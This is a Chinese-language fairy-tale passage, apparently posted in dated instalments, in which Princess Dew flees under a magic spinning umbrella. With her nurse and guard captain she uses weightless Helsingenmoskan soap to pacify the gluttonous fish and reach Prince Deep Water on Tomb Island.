<p>“如果也能找到父王和母后的画像……”公主拉住空灵画师急切地说。老画师缓缓地摇摇头，“我的公主，来不及了，他们已经没有了，他们现在就是那两幅画像了，如果找得到不要毁掉，留作祭奠吧。”</p>
<p>露珠公主被巨大的悲痛压倒，她跌坐在地上掩面痛哭起来。“我的公主，现在不是哀伤的时候，要想为国王和王后复仇，就赶快上路吧！”老画师说着，转向宽姨和卫队长，“你们要注意，在找到并毁掉公主的画像之前，伞要一直给她打着，一刻都不能离开，也不能合上。”他把伞从宽姨手中拿过来，继续转动着，“伞不能转得太慢，那样它就会合上；也不能太快，因为这伞年代已久，转得太快会散架的。黑伞有灵气，如果转得慢了，它会发出像鸟叫的声音，你们听，就是这样——”老画师把伞转得慢了些，伞面在边缘那些石球的重量下慢慢下垂，这时能听到它发出像夜莺一样的叫声，伞转得越慢声音越大。老画师重新加快了转伞的速度，鸟鸣声变小消失了。“如果转得太快，它会发出铃声，就像这样——”老画师继续加快转伞的速度，能听到一阵由小到大的铃声，像风铃，但更急促，“好了，现在快把伞给公主打上。”他说着，把伞又递给宽姨。</p>
<p>“老人家，我们俩一起打伞走吧。”露珠公主抬起泪眼说。“不行，黑伞只能保护一个人，如果两个被针眼画出的人一起打伞，那他们都会死，而且死得更惨：每个人的一半被画入画中，一半留在外面……快给公主打伞，拖延一刻危险就大一分，针眼随时可能把她画出来！”</p>
<p>宽姨看看公主，又看看空灵画师，犹豫着。老画师说：“是我把这画技传授给那个孽种，我该当此罪。你还等什么？想看着公主在你面前消失？！”</p>
<p>最后一句话令宽姨颤抖了一下，她立刻把伞移到公主上方。老画师抚着白须从容地笑起来，“这就对了，老夫绘画一生，变成一幅画也算死得其所。我相信那个孽种的技艺，那会是一幅精致好画的……”</p>
<p>空灵大画师的身体渐渐变得透明，然后像雾气一般消失了。露珠公主看着老画师消失的那片空间，喃喃地说：“好吧，我们走，去饕餮海。”宽姨对门口的卫队长说：“你快过来给公主打伞，我去收拾一下。”</p>
<p>卫队长接过伞后说：“要快些，现在外面都是冰沙王子的人了，天亮后我们可能会出不了王宫。”“可我总得给公主带些东西，她从来没有出过远门，我要带她的斗篷和靴子，她的好多衣服，她喝的水，至少……至少要带上那块赫尔辛根默斯肯出产的好香皂，公主只有用那香皂洗澡才能睡着觉……”宽姨唠唠叨叨地走出房间。</p>
<p>半个小时后，在初露的曙光中，一辆轻便马车从一个侧门驶出王宫，卫队长赶着车，车上坐着露珠公主和给她打伞的宽姨，他们都换上了平民装束。马车很快消失在远方的雾霭中。这时，在那个阴森的地堡中，针眼画师刚刚完成露珠公主的画像，他对冰沙王子说，这是他画过的最美的一幅画。</p>
<p>2016-01-28</p>
<p>饕餮海</p>
<p>出了王宫后，卫队长驾车一路狂奔。三个人都很紧张，他们感觉在未尽的夜色里，影影绰绰掠过的树木和田野中充满危险。天亮了一些后，车驶上了一个小山冈，卫队长勒住马，他们向来路眺望。王国的大地在他们下面铺展开来，他们来的路像一条把世界分成两部分的长线，线的尽头是王宫，已远在天边，像被遗失在远方的一小堆积木玩具。没有看到追兵，显然冰沙王子认为公主已经不存在了，被画到了画中。以后他们可以从容地赶路了。在天亮的过程中，周围的世界就像是一幅正在绘制中的画，开始只有朦胧的轮廓和模糊的色彩，后来，景物的形状和线条渐渐清晰精细，色彩也丰富明快起来。在太阳升起前的一刹那，这幅画已经完成。常年深居王宫的公主从来没有见过这样大块大块的鲜艳色彩：森林草地和田野的大片绿色、花丛的大片鲜红和嫩黄、湖泊倒映着的清晨天空的银色、早出的羊群的雪白……太阳升起时，仿佛绘制这幅画的画师抓起一把金粉豪爽地撒向整个画面。</p>
<p>“外面真好，我们好像已经在画中呢。”公主赞叹道。“是啊，公主，可是在这幅画里你活着，而在那幅画中你就死了。”打伞的宽姨说。</p>
<p>这话又让公主想起了已经离去的父王和母后，但她抑制住了眼泪，她知道自己现在再也不是一个小女孩，她应该担当起王国的重任了。他们谈起了深水王子。</p>
<p>“他为什么被流放到墓岛上？”公主问。“人们都说他是怪物。”卫队长说。</p>
<p>“深水王子不是怪物！”宽姨反驳道。“人们说他是巨人。”</p>
<p>“深水不是巨人！他小的时候我还抱过他，他不是巨人。”“等我们到海边你就会看到的，他肯定是巨人，好多人都看到了。”</p>
<p>“就算深水是巨人，他也是王子，为什么要流放到岛上？”公主问。“他没有被流放，他小时候坐船去墓岛上钓鱼，正好那时饕餮鱼在海上出现，他就回不来了，只好在岛上长大。”</p>
<p>……太阳升起后，路上的行人和马车渐渐多起来。由于公主以前几乎没有出过王宫，所以人们都不认识她，但尽管她现在还戴着面纱，只露出两只眼睛，看到她的人仍惊叹她的美丽。人们也称赞驾车的小伙子的孔武英俊，笑话那个老妈妈为她的美丽女儿打着的那把奇怪的伞和她那奇怪的打伞方式。好在没有人质疑伞的用途，今天阳光灿烂，人们都以为这是遮阳伞。不知不觉到了中午，卫队长用弓箭射了两只兔子做午餐。三人坐在路边树丛间的空地上吃饭。露珠公主摸着身旁柔软的草地，嗅着青草和鲜花的清香，看着阳光透过树叶投在草地上的光斑，听着林中的鸟鸣和远处牧童的笛声，对这个新世界充满了好奇和惊喜。</p>
<p>宽姨却长叹一声，“唉，公主啊，离开王宫这么远，真让你受罪了。”“我觉得外面比王宫好。”公主说。</p>
<p>“我的公主哇，外面哪有王宫里好？你真是不知道，外面有很多难处呢，现在是春天，冬天外面会冷，夏天会热，外面会刮风下雨，外面什么样的人都有，外面……”“可我以前对外面什么都不知道。我在王宫里学音乐，学绘画，学诗歌和算术，还学着两种谁都不说的语言，可没人告诉我外面是什么样子，我这样怎么能统治王国呢？”</p>
<p>“公主，大臣们会帮你的。”“能帮我的大臣都被画到画里了……我还是觉得外面好。”</p>
<p>从王宫到海边有一个白天的路程，但公主一行不敢走大道，遇到城镇就绕开，所以直到半夜才到达。露珠公主从来没有见过这样广阔的星空，也第一次领略了夜的黑暗和寂静，车上的火把只能照亮周围一小块地方。再往远处，世界就是一大块模糊的黑天鹅绒。马蹄声很响，像要把星星震下来。公主突然拉住卫队长，让他把马车停下。</p>
<p>“听，这是什么声音？像巨人的呼吸。”“公主，这是海的声音。”又前行了一段，公主看到两旁有许多在夜色中隐约可见的物体，像一根根大香蕉。</p>
<p>“那些是什么？”她问。卫队长又停下车，取下车上的火把走到最近的一个旁边，“公主，你应该认识这个的。”</p>
<p>“船？”“是的，公主，是船。”</p>
<p>“可船为什么在陆地上？”“因为海里有饕餮鱼。”</p>
<p>在火把的光芒中可以看到，这艘船已经很旧了，船身被沙子埋住一半，露在外面的部分像巨兽的白骨。“啊，看那里！”公主又指着前方惊叫，“好像有一条白色的大蛇！”</p>
<p>“不要怕公主，那不是蛇，是海浪，我们到海边了。”公主和为她打伞的宽姨一起下车，她看到了大海。她以前只在画中见过海，那画的是蓝天下的蓝色海洋，与这夜空下的黑色海洋完全不同，这泛着星光的博大与神秘，仿佛是另一个液态的星空。公主不由自主地向海走去，却被卫队长和宽姨拦住了。</p>
<p>“公主，离海太近危险。”卫队长说。“我看前面水不深，能淹死我吗？”公主指指沙滩上的白浪说。</p>
<p>“海里有饕餮鱼，它们会把你撕碎吃掉的！”宽姨说。卫队长拾起一块破船板，走上前去把船板扔到海中。船板在海面晃荡了几下，很快附近一个黑影浮出水面向它扑去，由于大部分在水下，看不出那东西的大小，它身上的鳞片在火把的光中闪亮。紧接着又有三四个黑影飞快地游向船板，在水中争抢成一团，伴随着哗哗的水声，可以听到利齿发出的咔嚓咔嚓声，仅一转眼的工夫，黑影和船板都不见了。</p>
<p>“看到了吗？它们能在很短的时间里把一艘大船咬成碎片。”卫队长说。“墓岛呢？”宽姨问。</p>
<p>“在那个方向，”卫队长指指黑暗的水天相连处，“夜里看不见，天一亮就能看见。”他们在沙滩上露营。宽姨把伞交给卫队长打，从马车上拿下一个小木盆。</p>
<p>“公主呀，今天是不能洗澡了，可你至少该洗洗脸的。”卫队长把伞交还给宽姨，说他去找水，就拿着盆消失在夜色中。</p>
<p>“他是个好小伙子。”宽姨打着哈欠说。卫队长很快回来，不知从什么地方打来了一盆清水。宽姨为公主洗脸，她拿一块香皂在水中只蘸了一下，一声轻微的吱啦声后，盆面立刻堆满了雪白的泡沫，鼓出圆圆的一团，还不断地从盆沿溢出来。</p>
<p>卫队长盯着泡沫看了一会儿，对宽姨说：“让我看看那块香皂吧。”宽姨从包裹中小心翼翼地拿出一块雪白的香皂，递给卫队长，“拿好了，它比羽毛还轻，一点儿分量都没有，一松手就飘走了。”</p>
<p>卫队长接过香皂，真的感觉不到一点儿分量，像拿着一团白色的影子。“这还真是赫尔辛根默斯肯香皂，现在还有这东西？”“我只有两块了，整个王宫，我想整个王国，也只剩这最后两块了，是我早些年特意给公主留的。唉，赫尔辛根默斯肯的东西都是好东西，可惜现在越来越少了。”宽姨说着，把香皂拿回来小心地放回包裹中。</p>
<p>看着那团白泡沫，公主在出行后第一次回忆起王宫中的生活。每天晚上，在她那精美华丽的浴宫中，大浴池上就浮着一大团这样的泡沫，灯光从不同方向照来，大团泡沫忽而雪白，像从白天的天空中抓来的一朵云；忽而变幻出霓彩，像宝石堆成的。泡到那团泡沫中，公主会感到身体变得面条般柔软，感到自己在融化，成了泡沫的一部分，那舒服的感觉让她再也不想动弹，只能由女仆把她抱出去擦干，再抱她去床上睡觉。那种美妙的感觉可以一直持续到第二天早晨。现在，公主用赫尔辛根默斯肯香皂洗过的脸很轻松很柔软，身上却僵硬而疲劳。随便吃了些东西后，她便在沙滩上躺下，开始时铺了一张毯子，后来发现直接躺到沙上更舒服。柔软的沙层带着白天阳光的温度，她感觉像被一只温暖的大手捧在手心，涛声像催眠曲，她很快睡着了。</p>
<p>不知过了多长时间，露珠公主被一阵铃声从无梦的酣睡中惊醒，那声音是从她上方旋转的黑伞中发出的。宽姨睡在她旁边，打伞的是卫队长，火把已经熄灭，夜色像天鹅绒般笼罩着一切，卫队长是星空背景前的一个剪影，只有他的盔甲映出星光，还可以看到海风吹起他的头发。伞在他的手中稳稳地旋转着，像一个小小的穹顶遮住了一半夜空。她看不见他的眼睛，但能感觉到他的目光，他与无数眨眼的星星一起看着自己。“对不起公主，我刚才转得太快了。”卫队长低声说。</p>
<p>“现在什么时间了？”“后半夜了。”</p>
<p>“我们离海好像远了。”“公主，这是退潮，海水后退了，明天早上还会涨起来。”</p>
<p>“你们轮流为我打伞吗？”“是的，公主，宽姨打了一白天，我夜里多打一会儿。”</p>
<p>“你也驾了一天车，让我自己打一会儿伞，你也睡吧。”说出这些话后，露珠公主自己也有些吃惊，在她的记忆里，这是自己第一次为别人着想。</p>
<p>“那不行，公主，你的手那么细嫩，会磨起泡的，还是让我为你打伞吧。”“你叫什么名字？”</p>
<p>同行已经一天，她现在才问他的名字。放在以前她会觉得很正常，甚至永远不问都很正常，但现在她为此有些内疚。“我叫长帆。”</p>
<p>“帆？”公主转头看看，他们现在是在沙滩上的一艘大船旁边，这里可以避海风。与其他那些搁浅在海滩上的船不同，这艘船的桅杆还在，像一把指向星空的长剑。“帆是不是挂在这根长杆上的大布？”“是的，公主，那叫桅杆，帆挂在上面，风吹帆推动船。”</p>
<p>“帆在海面上雪白雪白的，很好看。”“那是在画中吧，真正的帆没有那么白的。”</p>
<p>“你好像是赫尔辛根默斯肯人？”“是的，我父亲是赫尔辛根默斯肯的建筑师，在我很小的时候，他带着全家来到了这里。”</p>
<p>“你想回家吗，我是说赫尔辛根默斯肯？”“不太想，我小时候就离开那里，记得不太清了，再说想也没用，现在永远也不可能离开无故事王国了。”</p>
<p>远处，海浪哗哗地喧响，仿佛在一遍遍地重复着长帆的话：永远不可能离开，永远不可能离开……“给我讲讲外面世界的故事吧，我什么都不知道。”公主说。</p>
<p>“你不需要知道，你是无故事王国的公主，王国对你来说当然是无故事的。其实，公主，外面的人们也不给孩子们讲故事，但我的父母不一样，他们是赫尔辛根默斯肯人，他们还是给我讲了一些故事的。”“其实父王说过，无故事王国从前也是有故事的。”</p>
<p>“是的……公主，你知道王国的周围都是海吧，王宫在王国的中心，朝任何一个方向走，最后都会走到海边，无故事王国就是一个大岛。”“这我知道。”</p>
<p>“以前，王国周围的海不叫饕餮海，那时海中没有饕餮鱼，船可以自由地在海上航行，无故事王国和赫尔辛根默斯肯之间每天都有无数的船只来往。那时无故事王国其实是叫故事王国，那时的生活与现在很不一样。”“嗯？”</p>
<p>“那时生活中充满了故事，充满了变化和惊奇。那时，王国中有好几座繁华的城市，王宫的周围不是森林和田野，而是繁华的首都。城市中到处可见来自赫尔辛根默斯肯的奇珍异宝和奇异器具。无故事王国，哦不，故事王国的物产也源源不断地从海上运往赫尔辛根默斯肯。那时，人们的生活变幻莫测，像骑着快马在山间飞奔，时而冲上峰顶，时而跌入深谷，充满了机遇和危险。穷人可能一夜暴富，富豪也可能转眼赤贫，早晨醒来，谁也不知道今天要发生什么事，要遇到什么样的人。到处是刺激和惊喜。“但有一天，一艘来自赫尔辛根默斯肯的商船带来一种珍奇的小鱼，这种鱼只有手指长，黑色的，貌不惊人，装在坚硬的铸铁水桶中。卖鱼的商人在王国的集市上表演，他将一把剑伸进铁桶中的水里，只听到一阵刺耳的‘咔嚓咔嚓’声，剑再抽出来时已被咬成了锯齿状。这种鱼叫饕餮鱼，是一种内陆的淡水鱼，生长在赫尔辛根默斯肯岩洞深处黑暗的水潭中。饕餮鱼在王国的市场上销路很好，因为它们的牙齿虽小，但像金刚石一样坚硬，可做钻头；它们的鳍也很锋利，能做箭头或小刀。于是，越来越多的饕餮鱼从赫尔辛根默斯肯运到了王国。在一次台风中，一艘运鱼船在王国沿海失事沉没，船上运载的二十多桶饕餮鱼全部倾倒进了海中。</p>
<p>“人们发现，饕餮鱼在海中能够飞快地生长，长得比在陆地上要大得多，能达到一人多长，同时繁殖极快，数量飞速增加。饕餮鱼开始啃食所有漂浮在海面上的东西，没来得及拖上岸的船，不管多大，都被啃成碎片，当一艘大船被饕餮鱼群围住时，它的船底很快被啃出大洞，但连沉没都来不及，就在海面上被咬成碎片，像融化掉一般。鱼群在故事王国的沿海环游，很快在王国周围的海中形成一道环形的屏障。“故事王国就这样被周围海域中的饕餮鱼包围，沿海已成为死亡之地，不再有任何船只和风帆，王国被封闭起来，与赫尔辛根默斯肯和整个外部世界断绝了一切联系，过起了自给自足的田园生活。繁华的城市消失了，变成小镇和牧场，生活日渐宁静平淡，不再有变化，不再有刺激和惊喜，昨天像今天，今天像明天。人们渐渐适应了这样的日子，不再向往其他的生活。对过去的记忆，就像来自赫尔辛根默斯肯的奇异物品那样日渐稀少，人们甚至有意地忘记过去，也忘记现在。总的来说就是再不要故事了，建立了一个无故事的生活，故事王国也就变成了无故事王国。”</p>
<p>露珠公主听得入了迷，长帆停了好久，她才问：“现在海洋上到处都有饕餮鱼吗？”“不，只是在无故事王国的沿海有，眼神好的人有时能看到海鸟浮在离岸很远的海面上捕食，那里没有饕餮鱼。海洋很大，无边无际。”</p>
<p>“就是说，世界除了无故事王国和赫尔辛根默斯肯，还有别的地方？”“公主，你认为世界只有这两个地方吗？”</p>
<p>“小时候我的宫廷老师就是这么说的。”“这话连他自己都不信。世界很大，海洋无边无际，有无数的岛屿，有的比王国小，有的比王国大；还有大陆。”</p>
<p>“什么是大陆？”“像海洋一样广阔的陆地，骑着快马走几个月都走不到边。”</p>
<p>“世界那么大？”公主轻轻感叹，又突然问道，“你能看到我吗？”“公主，我现在只能看到你的眼睛，那里面有星星。”</p>
<p>“那你就能看到我的向往，真想乘着帆船在海上航行，到很远很远的地方去。”“不可能了，公主，我们永远不可能离开无故事王国，永远不能……你要是怕黑，我可以点上火把。”</p>
<p>“好的。”火把点燃后，露珠公主看着卫队长，却发现他的目光投向了别的地方。</p>
<p>“你在看什么？”公主轻声问。“那里，公主，你看那个。”</p>
<p>长帆指的是公主身边一小丛长在沙里的小草，草叶上有几颗小水珠，在火光中晶莹地闪亮。“那叫露珠。”长帆说。</p>
<p>“哦，那是我吗？像我吗？”“像你，公主，都像水晶一样美丽。”</p>
<p>“天亮后它们在太阳光下会更美的。”卫队长发出一声叹息，很深沉，根本没有声音，但公主感觉到了。</p>
<p>“怎么了，长帆？”“露珠在阳光下会很快蒸发消失。”</p>
<p>公主轻轻点点头，火光中她的目光黯然了，“那更像我了，这把伞一合上，我就会消失，我就是阳光下的露珠。”“我是不会让你消失的，公主。”</p>
<p>“你知道，我也知道，我们到不了墓岛，也不可能把深水王子带回来。”“要是那样，公主，我就永远为你打伞。”</p>
<p>2016-01-29</p>
<p>深水王子</p>
<p>露珠公主再次醒来时，天已经亮了，大海由黑色变成了蓝色，但公主仍然感觉与画中见过的完全不同。曾被夜色掩盖的广阔现在一览无遗，在清晨的天光下，海面上一片空旷。但在公主的想象中，这空旷并不是饕餮鱼所致，海是为了她空着，就像王宫中公主的宫殿空着等她入住一样。夜里对长帆说过的那种愿望现在更加强烈，她想象着广阔的海面上出现一叶属于她的白帆，顺风漂去，消失在远方。现在为她打伞的是宽姨，卫队长在前面的海滩上向她们打招呼，让她们过去。等她们走去后，他朝海的方向一指说：“看，那就是墓岛。”</p>
<p>公主首先看到的不是墓岛，而是站在小岛上的那个巨人，那显然就是深水王子。他顶天立地站在岛上，像海上的一座孤峰。他的皮肤是日晒的棕色，强健的肌肉像孤峰上的岩石，他的头发在海风中飘荡，像峰顶的树丛。他长得很像冰沙，但比冰沙强壮，也没有后者的阴郁，他的目光和表情都给人一种大海般豁达的感觉。这时太阳还没有升起，但巨人的头顶已经沐浴在阳光中，金灿灿的，像着火似的。他用巨手搭凉棚眺望着远方，有那么一瞬间，公主感觉她和巨人的目光相遇了，就跳着大喊：“深水哥哥！我是露珠！我是你的妹妹露珠！我们在这里！”</p>
<p>巨人没有反应，他的目光从这里扫过，移向别处，然后放下手，若有所思地摇摇头，转向另一个方向。“他为什么注意不到我们？”公主焦急地问。</p>
<p>“谁会注意到远处的三只小蚂蚁呢？”卫队长说，然后转向宽姨，“我说深水王子是巨人吧，你现在看到了。”“可我抱着他的时候他确实是一个小小的婴儿呀！怎么会长得这么高？不过巨人好啊，谁也挡不住他，他可以惩罚那些恶人，为公主找回画像了！”</p>
<p>“那首先得让他知道这里发生了什么事。”卫队长摇摇头说。“我要过去，我们必须过去！到墓岛上去！”公主抓住长帆说。</p>
<p>“过不去的，公主，这么多年了，没有人能够登上墓岛，那岛上也没有人能回来。”“真想不出办法吗？”公主急得流出了眼泪，“我们到这里来就是为了找他，你一定知道该怎么办的！”</p>
<p>看着公主泪眼婆娑，长帆很不安，“我真的没办法，到这里来是对的，你必须远离王宫，否则就是等死，但我当初就知道不可能去墓岛。也许……可以用信鸽给他送一封信。”“那太好了，我们这就去找信鸽！”</p>
<p>“但那又有什么用呢？即使他收到了信，也过不来，他虽然是巨人，到海中也会被饕餮鱼撕碎的……先吃了早饭再想办法吧，我去准备。”“哎呀，我的盆！”宽姨叫起来，由于涨潮，海水涌上了沙滩，把昨天晚上公主洗脸用的木盆卷到了海中。盆已经向海里漂出了一段距离，盆倒扣着，里面的洗脸水在海面泛起一片雪白的肥皂泡沫。可以看到有几条饕餮鱼正在向盆游去，它们黑色的鳍像利刀一样划开水面，眼看木盆就要在它们的利齿下粉身碎骨了。</p>
<p>但一件不可思议的事发生了：饕餮鱼没有去啃啮木盆，而是都游进了那片泡沫中，一接触泡沫，它们立刻停止游动，全都浮上了水面，凶悍之气荡然无存，全变成了一副懒洋洋的样子，有的慢慢摆动鱼尾，不是为了游动而是表示惬意；有的则露出白色的肚皮仰躺在水面上。三个人吃惊地看了一会儿，公主说：“我知道它们的感觉，它们在泡沫中很舒服，浑身软软的像没有骨头一样，不愿意动。”</p>
<p>宽姨说：“赫尔辛根默斯肯的香皂确实是好东西，可惜只有两块了。”卫队长说：“即使在赫尔辛根默斯肯，这种香皂也很珍贵。你们知道它是怎样造出来的吗？赫尔辛根默斯肯有一片神奇的树林，那些树叫魔泡树，都长了上千年，很高大。平时魔泡树没有什么特别之处，但如果刮起大风，魔泡树就会被吹出肥皂泡来，风越大吹出的泡越多，赫尔辛根默斯肯香皂就是用那种泡泡做成的。收集那些肥皂泡十分困难，那些泡泡在大风中飘得极快，加上它们是全透明的，你站在那里很难看清它们，只有跑得和它们一样快，才能看到它们。骑最快的马才能追上风中的泡泡，这样的快马在整个赫尔辛根默斯肯不超过十匹。当魔泡树吹出泡泡时，制肥皂的人就骑着快马顺风狂奔，在马上用一种薄纱网兜收集泡泡。那些泡泡有大有小，但即使最大的泡泡，被收集到网兜里破裂后，也只剩下肉眼都看不见的那么一小点儿。要收集几十万甚至上百万的泡泡才能造出一块香皂，但香皂中的每一个魔树泡如果再溶于水，就又能生发出上百万个泡泡，这就是香皂泡沫这么多的原因。魔泡树的泡泡都没有重量，所以真正纯的赫尔辛根默斯肯香皂也完全没重量，是世界上最轻的东西，但很贵重。宽姨的那些香皂可能是国王加冕时赫尔辛根默斯肯使团带来的赠礼，后来……”</p>
<p>长帆突然停止了讲述，若有所思地盯着海面。那里，在雪白的赫尔辛根默斯肯香皂的泡沫中，那几条饕餮鱼仍然懒散地躺浮着，在它们前面，是完好无损的木盆。“好像有一个办法到墓岛上去！”长帆指着海面上的木盆说，“你们想想，那要是一只小船呢？”</p>
<p>“想也别想！”宽姨大叫起来，“公主怎么能冒这个险？！”“公主当然不能去，让我去。”卫队长从海面收回目光，从他坚定的眼神中，公主看出他已经下定了决心。</p>
<p>“你一个人去，怎样让深水王子相信你？”公主说，她兴奋得脸颊通红，“我去，我必须去！”“可就算你到了岛上，又怎么证明自己的身份？”卫队长打量着一身平民装束的公主说。</p>
<p>宽姨没有说话，她知道有办法。“我们可以滴血认亲。”公主说。</p>
<p>“即使这样公主也不能去！这太吓人了！”宽姨说，但她的口气已经不是那么决绝。“我待在这里就安全吗？”公主指着宽姨手中旋转着的黑伞说，“我们太引人注意了，冰沙很快会知道我们的行踪，在这里，我就是暂时逃过了那张画，也逃不脱禁卫军的追杀，到墓岛上反而安全些。”</p>
<p>于是他们决定冒险了。卫队长从沙滩上找了一只最小的船，用马拖到水边，就在浪花刚舔到船首的地方。找不到帆，但从其他的船上找到两支旧桨。他让公主和打伞的宽姨上了船，将宽姨拿出来的赫尔辛根默斯肯香皂穿到剑上递给公主，告诉她船一下海就把香皂浸到水里。然后他向海里推船，一直推到水齐腰深的地方才跳上船全力划桨，小船载着三人向墓岛方向驶去。饕餮鱼的黑鳍在周围的海面上出现，向小船围拢过来。公主坐在船尾，把穿在剑上的赫尔辛根默斯肯香皂浸到海水中，船尾立刻涌现一大团泡沫，在早晨的阳光中发出耀眼的白光，泡沫团迅速膨胀至一人多高，并在船尾保持这个高度，在后面则随着船的前行扩散开来，在海面形成雪白的一片。饕餮鱼纷纷游进泡沫浮在其中，像躺在雪白的毛绒毯上一样享受着无与伦比的舒适惬意。公主第一次这么近看饕餮鱼，它们除了肚皮通体乌黑，像钢铁做成的机器，但一进入泡沫就变得懒散温顺。小船在平静的海面上前进，后面拖曳了一条长长的泡沫尾迹，像一道落在海上的白云带。无数的饕餮鱼从两侧游过来进入泡沫中，像在进行一场云河中的朝圣。偶尔也有几条从前方游来的饕餮鱼啃几下船底，还把卫队长手中的木桨咬下了一小块，但它们很快就被后面的泡沫所吸引，没有造成大的破坏。看着船后海面上雪白的泡沫云河，以及陶醉其中的饕餮鱼，公主不由得想起了牧师讲过的天堂。</p>
<p>海岸渐渐远离，小船向墓岛靠近。宽姨突然喊道：“你们看，深水王子好像矮了一些！”</p>
<p>公主转头望去，宽姨说得没错，岛上的王子仍是个巨人，但比在岸上看明显矮了一些，此时他仍背对着他们，眺望着别的方向。公主收回目光，看着划船的长帆，他此时显得更加强健有力，强劲的肌肉块块鼓起，两支长桨在他手中像一对飞翔的翅膀，推动着小船平稳前行。这人似乎天生是一个水手，在海上显然比在陆地更加自如。</p>
<p>“王子看到我们了！”宽姨又喊道。墓岛上，深水王子转向了这边，一手指着小船的方向，眼中透出惊奇的目光，嘴还在动，像喊着什么。他肯定会感到惊奇，除了这只出现在死亡之海上的小船外，船后的泡沫扩散开来，向后宽度逐渐增大，从他那个高度看过去，海面上仿佛出现了一颗拖着雪白彗尾的彗星。他们很快知道王子并非对他们喊话，他的脚下出现了几个正常身高的人。从这个距离上，他们看上去很小，脸也看不清，但肯定都在朝这个方向看，有的还在挥手。墓岛原是个荒岛，没有原住民。二十年前，深水去岛上钓鱼时，陪同他的有一名监护官、一名王宫老师、几名护卫和仆从。他们刚上岛，成群的饕餮鱼就游到这片沿海，封死了他们回王国的航路。</p>
<p>他们发现，现在王子看上去又矮了一些，似乎小船距海岛越近，王子就越矮。小船渐渐接近岛岸，可以看清那些正常身高的人了，他们共八个人，大部分都穿着和王子一样的用帆布做的粗糙衣服，其中有两个老者穿着王宫的制服，但都已经很破旧了，这些人大都挂着剑。他们向海滩跑来，王子远远地跟在后面，这时，他看去仅有其他人的两倍高，不再是巨人了。</p>
<p>卫队长加速划行，小船冲向岛岸，一道拍岸浪像巨手把小船向前推，船身震动了一下，差点把公主颠下船去，船底触到了沙滩。那些已经跑到海滩上的人看着小船犹豫不前，显然是怕水中的饕餮鱼，但还是有四个人跑上前来，帮忙把船稳住，扶公主下船。“当心，公主不能离开伞！”下船时宽姨高声说，同时使伞保持在公主上方，她这时打伞已经很熟练了，用一只手也能保持伞的旋转。</p>
<p>那些人毫不掩饰自己的惊奇，时而看看旋转的黑伞，时而看看小船经过的海面——那里，赫尔辛根默斯肯香皂的白沫和浮在海面的无数饕餮鱼形成了一条黑白相间的海路，连接着墓岛和王国海岸。深水王子也走上前来，这时，他的身高与普通人无异，甚至比这群人中的两个高个子还矮一些。他看着来人微笑着，像一个宽厚的渔民，但公主却从他身上看到了父王的影子，她扔下剑，热泪盈眶地喊道：“哥哥，我是你的妹妹露珠！”“你像我的妹妹。”王子微笑着点点头，向公主伸出双手。但几个人同时阻止了公主的靠近，把三位来者与王子隔开，其中有人佩剑已出鞘，警惕地盯着刚下船的卫队长。后者没有理会这边的事，只是拾起公主扔下的剑察看，为了避免对方误会，他小心地握着剑尖，发现经过这段航程，那块穿在剑上的赫尔辛根默斯肯香皂只消耗了三分之一左右。</p>
<p>“你们必须要证实公主的身份。”一位老者说，他身上破旧的制服打理得很整齐，脸上饱经风霜，但留着像模像样的胡须，显然在这孤岛岁月中他仍尽力保持着王国官员的仪表。“你们不认识我了吗？你是暗林监护官，你——”宽姨指指另一位老者，“是广田老师。”两位老者都点点头。广田老师说：“宽姨，你老了。”</p>
<p>“你们也老了。”宽姨说着，腾出一只转伞的手抹眼泪。暗林监护官不为所动，仍一丝不苟地说：“二十多年了，我们一点都不知道王国发生了什么，所以还是必须证实公主的身份，”他转向公主，“请问，您愿意滴血认亲吗？”</p>
<p>公主点点头。“我觉得没必要，她肯定是我的妹妹。”王子说。</p>
<p>“殿下，必须这样做。”监护官说。有人拿来两把很小的匕首，给监护官和老师每人一把。与这些人锈迹斑斑的佩剑不同，两把匕首寒光闪闪，像新的一样。公主伸出手来，监护官用匕首在她白嫩的食指上轻轻划了一下，用刀尖从破口取了一滴血。广田老师也从王子的手指上取了血样，监护官从老师手中拿过匕首，小心翼翼地把刀尖上的两滴血混在一起，血立刻变成了纯蓝色。</p>
<p>“她是露珠公主。”监护官庄重地对王子说，然后同老师一起向公主鞠躬。其他的几个人都扶着剑柄单膝跪下，然后站起来闪到一边，让王子和公主兄妹拥抱在一起。“小时候我抱过你，那时你才这么大。”王子比划着说。公主向王子哭诉王国已经发生的事，王子握着她的手静静地听着，他那饱经风霜但仍然年轻的脸上表情一直从容镇定。</p>
<p>大家都围在王子和公主周围，静静地听着公主的讲述，只有卫队长在做着一件奇怪的事。他时而快步跑开，在海滩上跑到很远的地方看着王子，然后又跑回来从近前看他，如此反复好几次，后来宽姨拉住了他。“还是我说得对，王子不是巨人吧。”宽姨指指王子低声说。</p>
<p>“他既是巨人又不是巨人。”卫队长也压低声音说，“是这样的：我们看一般的人，他离得越远在我们眼中就越小，对吧？但王子不是这样，不管远近，他在我们眼中的大小都是一样的，近看他是普通身高，远看还是这么高，所以远看就像巨人了。”宽姨点点头，“好像真是这样。”</p>
<p>听完公主的讲述，深水王子只是简单地说：“我们回去。”回王国的船有两只，王子与公主一行三人坐在小船上，其余八人乘另一只更大些的船，是二十年前载着王子一行来墓岛的船，有些漏水，但还能短程行驶。在来时的航道中，泡沫消散了一些，但无数的饕餮鱼仍然浮在海面上很少动弹，有些饕餮鱼被船头撞上，或被桨碰到，也只是懒洋洋地扭动几下，没有更多的动作。大船破旧的帆还能用，在前面行驶，从漂浮一片的饕餮鱼群中为后面的小船开出一条路来。</p>
<p>“你最好还是把香皂放到海里，保险一些，万一它们醒过来怎么办？”宽姨看着船周围黑压压的饕餮鱼，心有余悸地说。公主说：“它们一直醒着，只是很舒服，懒得动。香皂只剩一块半了，不要浪费，而且我以后再也不用它洗澡了。”</p>
<p>这时，前面的大船上有人喊道：“禁卫军！”在远处王国的海岸上出现了一支马队，像黑压压的潮水般涌上海滩，马上骑士的盔甲和刀剑在阳光中闪亮。</p>
<p>“继续走。”深水王子镇定地说。“他们是来杀我们的。”公主的脸色变得苍白。</p>
<p>“不要怕，没事的。”王子拍拍公主的手说。露珠公主看着哥哥，现在她知道他更适合当国王。</p>
